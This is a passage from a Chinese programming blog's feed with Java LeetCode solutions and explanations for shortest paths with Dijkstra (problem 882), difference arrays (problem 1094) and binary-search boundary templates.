class_">State</span>(nextId, nextW, nextK));</span><br><span class="line">                    stop[nextId] = nextK;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stop[nextId] &lt; nextK) &#123;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW, nextK));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> distance;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">State</span><span class="params">(<span class="type">int</span> _id, <span class="type">int</span> _distance, <span class="type">int</span> _k)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = _id;</span><br><span class="line">        <span class="built_in">this</span>.distance = _distance;</span><br><span class="line">        <span class="built_in">this</span>.k = _k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="882-细分图中的可到达节点"><a href="#882-细分图中的可到达节点" class="headerlink" title="882. 细分图中的可到达节点"></a>882. 细分图中的可到达节点</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/description/">882. 细分图中的可到达节点</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个无向图（<strong>原始图</strong>），图中有 <code>n</code> 个节点，编号从 <code>0</code> 到 <code>n - 1</code> 。你决定将图中的每条边 <strong>细分</strong> 为一条节点链，每条边之间的新节点数各不相同。</p><p>图用由边组成的二维数组 <code>edges</code> 表示，其中&nbsp;<code>edges[i] = [u<sub>i</sub>, v<sub>i</sub>, cnt<sub>i</sub>]</code> 表示原始图中节点&nbsp;<code>u<sub>i</sub></code> 和&nbsp;<code>v<sub>i</sub></code> 之间存在一条边，<code>cnt<sub>i</sub></code> 是将边 <strong>细分</strong> 后的新节点总数。注意，<code>cnt<sub>i</sub> == 0</code> 表示边不可细分。</p><p>要 <strong>细分</strong> 边 <code>[ui, vi]</code> ，需要将其替换为 <code>(cnt<sub>i</sub> + 1)</code> 条新边，和&nbsp;<code>cnt<sub>i</sub></code> 个新节点。新节点为 <code>x<sub>1</sub></code>, <code>x<sub>2</sub></code>, ..., <code>x<sub>cnt<sub>i</sub></sub></code> ，新边为 <code>[u<sub>i</sub>, x<sub>1</sub>]</code>, <code>[x<sub>1</sub>, x<sub>2</sub>]</code>, <code>[x<sub>2</sub>, x<sub>3</sub>]</code>, ..., <code>[x<sub>cnt<sub>i</sub>-1</sub>, x<sub>cnt<sub>i</sub></sub>]</code>, <code>[x<sub>cnt<sub>i</sub></sub>, v<sub>i</sub>]</code> 。</p><p>现在得到一个&nbsp;<strong>新的细分图</strong> ，请你计算从节点 <code>0</code> 出发，可以到达多少个节点？如果节点间距离是 <code>maxMoves</code> 或更少，则视为 <strong>可以到达</strong> 。</p><p>给你原始图和 <code>maxMoves</code> ，返回 <em>新的细分图中从节点 <code>0</code> 出发</em><strong><em> 可到达的节点数</em></strong>&nbsp;。</p><p><strong>示例 1：</strong></p><img alt="" src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/08/01/origfinal.png" class="lazyload" data-srcset="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/08/01/origfinal.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 247px; width: 600px;"><pre><strong>输入：</strong>edges = [[0,1,10],[0,2,1],[1,2,2]], maxMoves = 6, n = 3<strong>输出：</strong>13<strong>解释：</strong>边的细分情况如上图所示。可以到达的节点已经用黄色标注出来。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>edges = [[0,1,4],[1,2,6],[0,2,8],[1,3,1]], maxMoves = 10, n = 4<strong>输出：</strong>23</pre><p><strong>示例 3：</strong></p><pre><strong>输入：</strong>edges = [[1,2,4],[1,4,5],[1,3,1],[2,3,4],[3,4,5]], maxMoves = 17, n = 5<strong>输出：</strong>1<strong>解释：</strong>节点 0 与图的其余部分没有连通，所以只有节点 0 可以到达。</pre><p><strong>提示：</strong></p><ul>    <li><code>0 &lt;= edges.length &lt;= min(n * (n - 1) / 2, 10<sup>4</sup>)</code></li>    <li><code>edges[i].length == 3</code></li>    <li><code>0 &lt;= u<sub>i</sub> &lt; v<sub>i</sub> &lt; n</code></li>    <li>图中 <strong>不存在平行边</strong></li>    <li><code>0 &lt;= cnt<sub>i</sub> &lt;= 10<sup>4</sup></code></li>    <li><code>0 &lt;= maxMoves &lt;= 10<sup>9</sup></code></li>    <li><code>1 &lt;= n &lt;= 3000</code></li></ul></div><ol><li><p>思路</p><blockquote><p>这是最短路径的变种题，在求不超过阈值的范围内的最短路径，还要新加一层判断不能到的地方还能多走几步</p></blockquote></li><li><p>解题方法</p><blockquote><p>核心算法dijkstra不需要变，但是需要改变一下题目所给的权重，因为权重仅包含中间出现的节点，未包含上一个图的节点，所以初始化图的时候 <code>w</code> 需要 +1。</p></blockquote></li></ol><p>然后核心的关键在于求所有的节点：所有的总数 &#x3D; maxMoves步数内能到达的点的个数 + 中间的还有几个节点可以走</p><ol start="3"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reachableNodes</span><span class="params">(<span class="type">int</span>[][] edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">// 求最短路径的变种题，新加一层判断不能到的地方还能多走几步</span></span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt;[] graph = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            graph[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> edge[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> edge[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> edge[<span class="number">2</span>] + <span class="number">1</span>; <span class="comment">// +1 代表中间的节点数加上上一个位置的节点</span></span><br><span class="line">            graph[from].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;to, w&#125;);</span><br><span class="line">            graph[to].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;from, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dist = dijkstra(graph, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 先求maxMoves步数内能到达的点的个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dist[i] &lt;= maxMoves) &#123;</span><br><span class="line">                ans ++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ** 再求中间的还有几个节点可以走</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> edge[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> edge[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> edge[<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Math.max(maxMoves - dist[from], <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Math.max(maxMoves - dist[to], <span class="number">0</span>);</span><br><span class="line">            ans += Math.min(a + b, w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dijkstra(List&lt;<span class="type">int</span>[]&gt;[] graph, <span class="type">int</span> start) &#123;</span><br><span class="line">        <span class="type">int</span>[] dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        Arrays.fill(dist, Integer.MAX_VALUE);</span><br><span class="line">        Queue&lt;State&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a.dis - b.dis;</span><br><span class="line">        &#125;);</span><br><span class="line">        dist[start] = <span class="number">0</span>;</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(start, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">State</span> <span class="variable">cur</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">curId</span> <span class="operator">=</span> cur.id;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curW</span> <span class="operator">=</span> cur.dis;</span><br><span class="line">            <span class="keyword">if</span> (curW &gt; dist[curId]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span>[] neighbor: graph[curId]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> neighbor[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextW</span> <span class="operator">=</span> neighbor[<span class="number">1</span>] + curW;</span><br><span class="line">                <span class="keyword">if</span> (dist[nextId] &gt; nextW) &#123;</span><br><span class="line">                    dist[nextId] = nextW;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> dis;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">State</span><span class="params">(<span class="type">int</span> _id, <span class="type">int</span> _dis)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = _id;</span><br><span class="line">        <span class="built_in">this</span>.dis = _dis;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目给出的条件为：图、路径有权值、权重无负数、求路径长度最值，可以使用 dijkstra 求 &lt;em&gt;出发点&lt;/em&gt; 到其他点的 &lt;em&gt;最短路径&lt;/em&gt;，记住dijkstra算法模板，直接套上用，构建一个 &lt;code&gt;State&lt;/code&gt;类记录点的id和记录的最短路径长度，然后核心是最小堆，结合BFS遍历。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="最短路径" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
    
  </entry>
  
  <entry>
    <title>差分数组，解频繁增减的求和问题</title>
    <link href="https://blog.zhengxiangling.com/2023/11/18/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84%EF%BC%8C%E8%A7%A3%E9%A2%91%E7%B9%81%E5%A2%9E%E5%87%8F%E7%9A%84%E6%B1%82%E5%92%8C%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/11/18/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84%EF%BC%8C%E8%A7%A3%E9%A2%91%E7%B9%81%E5%A2%9E%E5%87%8F%E7%9A%84%E6%B1%82%E5%92%8C%E9%97%AE%E9%A2%98/</id>
    <published>2023-11-18T12:28:00.000Z</published>
    <updated>2023-11-18T12:37:45.941Z</updated>
    
    <content type="html"><![CDATA[<p>当题目给出的数据不是很大，需要快速求解数组区间的和，并且频繁的对数组内的值增加和减掉，可以考虑用差分数组来实现快速求区间值。</p><span id="more"></span><h5 id="1094-拼车"><a href="#1094-拼车" class="headerlink" title="1094.拼车"></a>1094.拼车</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/car-pooling/description/">1094. 拼车</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>车上最初有&nbsp;<code>capacity</code>&nbsp;个空座位。车&nbsp;<strong>只能&nbsp;</strong>向一个方向行驶（也就是说，<strong>不允许掉头或改变方向</strong>）</p><p>给定整数&nbsp;<code>capacity</code>&nbsp;和一个数组 <code>trips</code> , &nbsp;<code>trip[i] = [numPassengers<sub>i</sub>, from<sub>i</sub>, to<sub>i</sub>]</code>&nbsp;表示第 <code>i</code> 次旅行有&nbsp;<code>numPassengers<sub>i</sub></code>&nbsp;乘客，接他们和放他们的位置分别是&nbsp;<code>from<sub>i</sub></code>&nbsp;和&nbsp;<code>to<sub>i</sub></code>&nbsp;。这些位置是从汽车的初始位置向东的公里数。</p><p>当且仅当你可以在所有给定的行程中接送所有乘客时，返回&nbsp;<code>true</code>，否则请返回 <code>false</code>。</p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>trips = [[2,1,5],[3,3,7]], capacity = 4<strong>输出：</strong>false</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>trips = [[2,1,5],[3,3,7]], capacity = 5<strong>输出：</strong>true</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= trips.length &lt;= 1000</code></li>    <li><code>trips[i].length == 3</code></li>    <li><code>1 &lt;= numPassengers<sub>i</sub>&nbsp;&lt;= 100</code></li>    <li><code>0 &lt;= from<sub>i</sub>&nbsp;&lt; to<sub>i</sub>&nbsp;&lt;= 1000</code></li>    <li><code>1 &lt;= capacity &lt;= 10<sup>5</sup></code></li></ul></div><ol><li><p>思路</p><blockquote><p>题目给出的数据不是很大，然后需要频繁对车站人数上车和下车，即频繁的增加和减掉，可以考虑用差分数组来实现。</p></blockquote></li><li><p>解题方法</p><blockquote><p>差分数组，题目给出车站从0-1000，那么只需计算经过每个站车上的人数，不需要管需不需要下车， 求出每个站在车上的人数，然后再循环比对每个车站的人数，如果超过限制人数，直接返回false。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li><li><p>空间复杂度:</p></li></ul></li></ol><blockquote><p>$O(n)$</p></blockquote><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">carPooling</span><span class="params">(<span class="type">int</span>[][] trips, <span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="comment">// 差分数组，题目给出车站从0-1000，那么只需计算经过每个站车上的人数，不需要管需不需要下车</span></span><br><span class="line">        <span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1001</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] trip: trips) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> trip[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> trip[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> trip[<span class="number">2</span>] - <span class="number">1</span>; <span class="comment">// 比如第0站坐到第2个站，那么还在车上为0，1</span></span><br><span class="line">            <span class="comment">// 给 from 到 to - 1 的都加 p</span></span><br><span class="line">            nums[from] += p;</span><br><span class="line">            <span class="keyword">if</span> (to + <span class="number">1</span> &lt; <span class="number">1001</span>) &#123;</span><br><span class="line">                nums[to + <span class="number">1</span>] -= p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="comment">// 将差分数组转化为原数据</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1001</span>];</span><br><span class="line">        res[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; <span class="number">1001</span>; j++) &#123;</span><br><span class="line">            res[j] = res[j - <span class="number">1</span>] + nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 然后判断每个站的车上人数是否超载</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; <span class="number">1001</span>; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (res[k] &gt; capacity) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;当题目给出的数据不是很大，需要快速求解数组区间的和，并且频繁的对数组内的值增加和减掉，可以考虑用差分数组来实现快速求区间值。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="差分数组" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"/>
    
    
  </entry>
  
  <entry>
    <title>二分查找，找目标值（或边界）问题</title>
    <link href="https://blog.zhengxiangling.com/2023/11/18/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%EF%BC%8C%E6%89%BE%E7%9B%AE%E6%A0%87%E5%80%BC%EF%BC%88%E6%88%96%E8%BE%B9%E7%95%8C%EF%BC%89%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/11/18/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%EF%BC%8C%E6%89%BE%E7%9B%AE%E6%A0%87%E5%80%BC%EF%BC%88%E6%88%96%E8%BE%B9%E7%95%8C%EF%BC%89%E9%97%AE%E9%A2%98/</id>
    <published>2023-11-18T12:07:00.000Z</published>
    <updated>2023-11-19T06:50:21.994Z</updated>
    
    <content type="html"><![CDATA[<p>二分查找包括求查找中间值和左右边界值三种情况。</p><span id="more"></span><h5 id="二分查找（左右指针）模板"><a href="#二分查找（左右指针）模板" class="headerlink" title="二分查找（左右指针）模板"></a>二分查找（左右指针）模板</h5><p>左右指针即为最开始，左指针<code>left</code>在数组的最开始位置，右指针<code>right</code>在数组的末尾，然后循环时在判断左右指针什么时候开始相向移动，直至<code>left == right</code>左右指针相遇。</p><p>常见题目：二分查找，求两数之和、反转数组等。</p><p>重点为<code>二分查找</code>，二分查找的数组可能包含重复值，重复值的寻找条件可能包含第一寻找到相同元素返回、寻找指定元素的最左边界位置、寻找指定元素的最右边界位置等三种情况。三种边界的区别在于，寻找到指定元素后是否需要第一时间返回位置值，即<code>nums[mid]==target</code>时的操作不同，可见下列算法。</p><p>算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binary_search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 直接返回</span></span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直接返回</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">left_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 别返回，锁定左侧边界</span></span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 target 是否存在于 nums 中</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; <span class="number">0</span> || left &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断一下 nums[left] 是不是 target</span></span><br><span class="line">    <span class="keyword">return</span> nums[left] == target ? left : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">right_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 别返回，锁定右侧边界</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 target 是否存在于 nums 中</span></span><br><span class="line">    <span class="comment">// if (left - 1 &lt; 0 || left - 1 &gt;= nums.length) &#123;</span></span><br><span class="line">    <span class="comment">//     return -1;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 由于 while 的结束条件是 right == left - 1，且现在在求右边界</span></span><br><span class="line">    <span class="comment">// 所以用 right 替代 left - 1 更好记</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; <span class="number">0</span> || right &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[right] == target ? right : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2300-咒语和药水的成功对数（中等）"><a href="#2300-咒语和药水的成功对数（中等）" class="headerlink" title="2300.咒语和药水的成功对数（中等）"></a>2300.咒语和药水的成功对数（中等）</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/successful-pairs-of-spells-and-potions/description/">2300. 咒语和药水的成功对数</a></p></blockquote> <div class="elfjS" data-track-load="description_content"><p>给你两个正整数数组&nbsp;<code>spells</code> 和&nbsp;<code>potions</code>&nbsp;，长度分别为&nbsp;<code>n</code> 和&nbsp;<code>m</code>&nbsp;，其中&nbsp;<code>spells[i]</code>&nbsp;表示第&nbsp;<code>i</code>&nbsp;个咒语的能量强度，<code>potions[j]</code>&nbsp;表示第&nbsp;<code>j</code>&nbsp;瓶药水的能量强度。</p><p>同时给你一个整数&nbsp;<code>success</code>&nbsp;。一个咒语和药水的能量强度 <strong>相乘</strong> 如果&nbsp;<strong>大于等于</strong>&nbsp;<code>success</code>&nbsp;，那么它们视为一对&nbsp;<strong>成功</strong>&nbsp;的组合。</p><p>请你返回一个长度为 <code>n</code>&nbsp;的整数数组<em>&nbsp;</em><code>pairs</code>，其中<em>&nbsp;</em><code>pairs[i]</code>&nbsp;是能跟第 <code>i</code>&nbsp;个咒语成功组合的 <b>药水</b>&nbsp;数目。</p><p><strong>示例 